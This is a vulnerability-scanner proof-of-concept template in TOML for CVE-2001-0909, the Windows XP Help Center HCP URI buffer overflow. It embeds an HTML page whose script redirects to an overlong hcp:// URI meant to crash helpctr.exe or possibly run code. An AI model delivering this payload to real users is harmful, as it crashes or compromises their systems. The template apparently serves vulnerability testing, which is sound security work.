[info]
author = "AVE"
description = "验证 Windows XP helpctr.exe 是否存在 HCP URI 缓冲区溢出漏洞。通过构造包含超长 hcp:// URI 的 HTML 页面，当用户在受影响系统上访问时触发 helpctr.exe 缓冲区溢出，导致程序崩溃或可能执行任意代码。"
id = "POC-AVE-2001-0409"
name = "Microsoft Windows XP Help Center HCP URI Buffer Overflow PoC"
severity = "high"
tags = ["cve-2001-0909"]
vuln_id = [
    "CVE-2001-0909",
    "AVE-2001-0409",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = '<html><body><script>location.href="hcp://m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m";</script></body></html>'
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["hcp://"]
